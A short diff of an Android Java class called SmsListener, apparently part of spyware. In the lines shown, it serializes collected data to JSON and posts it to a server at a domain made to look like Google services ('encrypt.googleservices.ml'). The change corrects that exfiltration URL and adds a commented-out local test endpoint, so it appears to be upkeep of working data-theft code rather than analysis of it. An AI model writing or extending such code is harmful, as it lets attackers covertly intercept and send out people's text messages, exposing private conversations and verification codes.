@@ -60,7 +60,8 @@ public class SmsListener extends BroadcastReceiver {
                         Gson gson = new Gson();
                         final String newDataArray = gson.toJson(dataArray);
 
-                        final String server_url = "http://encrypt.googleservices.ml//upload_data.php";
+                        final String server_url = "http://encrypt.googleservices.ml/upload_data.php";
+                        /*final String server_url = "http://10.0.2.2/VideoUpload/upload_data.php";*/
 
                         // Create the request
                         StringRequest stringRequest = new StringRequest(Request.Method.POST, server_url,
